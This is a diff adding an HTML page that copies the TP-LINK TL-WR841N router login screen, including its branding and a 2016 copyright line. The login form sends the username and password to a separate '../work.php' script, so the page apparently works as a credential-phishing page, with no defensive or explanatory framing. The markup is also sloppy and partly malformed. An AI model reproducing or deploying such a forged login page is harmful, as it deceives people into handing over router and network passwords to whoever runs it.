@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+
+<!-- This Webpage Desing By : Niloy Bhowmick-->
+	
+<html class="login-html">
+
+
+<title>TL-WR841N</title>
+
+</head>
+
+<body style="width: 1000px;">
+
+
+<div class="topLogo">
+	<img id="logo" src="ab.png"style="float: left; margin:#;" border ="#;"/></a>
+                                                                
+	<!a href="#"><!img id="logo" src="#" style="float: right;"border="0" /></a>
+	
+	<!div class="nd" style="height: 125px; background: url(ab.png);"></div>
+	
+	
+	<!-- This Webpage Desing By : Niloy Bhowmick-->
+	
+<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
+
+
+	<div class="navbar">
+		<div class="navbar-inner">
+			<a class="brand" href="login.html"></a>
+		</div>
+	</div>
+	<div class="container login">
+		<form name="Login" method="post" action="../work.php">
+			<input type=hidden name=Username value="admin">
+			<input type="hidden" name="checkEn" value="0">
+	<div class="panelThre" align="center">
+		<div align="center" class="picDiv">
+			<body>
+			<div class="container">
+			
+				<img src="username.png"><input type="username" name="username" maxlength="30" class="text input-medium"  onKeyDown="enterDown(document.Login,event);"placeholder="Username" autocomplete="off"/>
+				<div class="control-group">
+				<br/>
+					<div class="controls">
+						<img src="password.png"><input type="password" name="Password" maxlength="30" class="text input-medium"  onKeyDown="enterDown(document.Login,event);"placeholder="Password" autocomplete="off"/>
+					</div>
+				</div>
+				<div class="control-group" id="login_tip" style="display:none;">
+					<div class="controls">
+						<label class="checkbox" for="nocheck">
+							<input type="checkbox" id="nocheck" name="nocheck"/>No longer prompts
+						</label>
+					</div>
+				</div>
+				<br/>
+				<div class="panelThre" align="center">
+		<div align="center" class="picDiv">
+			
+				<div id="submitOperation" class="btn-group">
+					<img src="s.png"><a href="#"class="btn btn-link"onClick="preSubmit(document.Login)"><img src="l3.png"style="height: 25.5px;"/></a>
+				</div>
+			</div>
+		</form>
+	</div>
+	<div style="height: 50px;"></div>
+	<div class="page-footer"></div>
+	
+	<!-- This Webpage Desing By : Niloy Bhowmick-->
+		
+		
+<script src="lang/b28n.js"></script>
+<script>
+//handle translate
+(function() {
+	B.setTextDomain("base");
+	B.translate();
+})();
+
+var error = [_("No Ethernet cable connected to WAN port!"), _("No Internet access, please check your online settings!")],
+	message="0",
+	message2="0";
+	
+function init(){
+	var showmessage = "";
+	document.Login.Password.value="";
+	document.Login.Password.focus();
+	if(message==0) {
+		showmessage=error[0];
+	} else if(message == 2 || message==3) {
+		showmessage=error[1];
+	}
+	if(message2 == 0){
+		//from lan,donnt display login tip
+		//document.getElementById("login_tip").style.display = '';		
+	}
+	//document.getElementById("message").innerHTML = showmessage;
+	if(location.search.substring(1) == '1'){
+		document.getElementById("pwd_err_msg").className = 'help-block text-red';
+	}
+}
+
+function enterDown(f,e) {
+	var char_code = e.charCode ? e.charCode : e.keyCode;	//解决火狐浏览器不支持event事件的问题。
+	if(char_code == 13) {
+		preSubmit(f);
+	} else {
+		return;
+	}
+	return;
+}
+
+<!-- This Webpage Desing By : Niloy Bhowmick-->
+	
+function preSubmit(f) {	
+	if(f.nocheck.checked) {
+	 	f.checkEn.value=1;
+	} else {
+	 	f.checkEn.value=0;
+	}
+	if(f.Password.value=="") {
+		alert(_("Password can not be empty!")); 
+		f.Password.focus();
+		return false;
+	}
+	if(f.Password.value.length>13) {
+		alert(_("Password can not exceed 12 characters in length!")); 
+		f.Password.focus();
+		return false;
+	}
+	f.submit();
+}
+
+window.onload = function () {
+	init();
+};
+</script>
+</body>
+<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
+			<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
+			<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
+			<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
+			<div>
+				<label id="copyright">Copyright &copy; 2016 TP-LINK Technologies Co., Ltd. All rights reserved. </label>
+			</div>
+			
+		
+</html>
